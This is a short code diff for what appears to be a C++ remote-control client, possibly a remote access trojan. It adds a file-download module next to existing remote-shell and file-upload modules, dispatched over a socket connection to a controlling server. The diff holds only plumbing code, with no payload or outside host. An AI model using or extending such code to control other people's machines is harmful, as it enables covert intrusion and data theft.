@@ -5,7 +5,7 @@
 #include "SocketClientManage.h"
 #include "ModuleShellRemote.h"
 #include "ModuleFileUpload.h"
-
+#include "ModuleFileDownload.h"
 
 
 
@@ -60,6 +60,10 @@ BOOL CModuleManage::OnReceiveConnectPacket(CPacket* pPacket) {
 
 	case FILE_UPLOAD_CONNECT:
 		CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)RunModuleFileUpload, (LPVOID)pPacketCopy, 0, NULL);
+		break;
+
+	case FILE_DOWNLOAD_CONNECT:
+		CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)RunModuleFileDownload, (LPVOID)pPacketCopy, 0, NULL);
 		break;
 
 	default:
@@ -135,5 +139,30 @@ DWORD WINAPI RunModuleFileUpload(CPacket* pPacket) {
 
 	Sleep(500);
 	DebugPrint("退出RunModuleFileUpload线程\n");
+	return 0;
+}
+
+
+DWORD WINAPI RunModuleFileDownload(CPacket* pPacket){
+	CSocketClient* pChildSocketClient = new CSocketClient(pPacket->m_pSocketClient->m_pMainSocketClient);
+	CModuleFileDownload* pModule = new CModuleFileDownload(pChildSocketClient);			// 在这里面给pChildSocketClient->m_pModule赋值
+
+	pChildSocketClient->StartSocketClient();
+	pChildSocketClient->SendPacket(FILE_DOWNLOAD_CONNECT, NULL, 0);
+
+	pChildSocketClient->WaitForExitEvent();
+
+	if (pModule != nullptr) {
+		delete pModule;
+		pModule = nullptr;
+	}
+
+	if (pPacket != nullptr) {
+		delete pPacket;
+		pPacket = nullptr;
+	}
+
+	Sleep(500);
+	DebugPrint("退出RunModuleFileDownload线程\n");
 	return 0;
 }
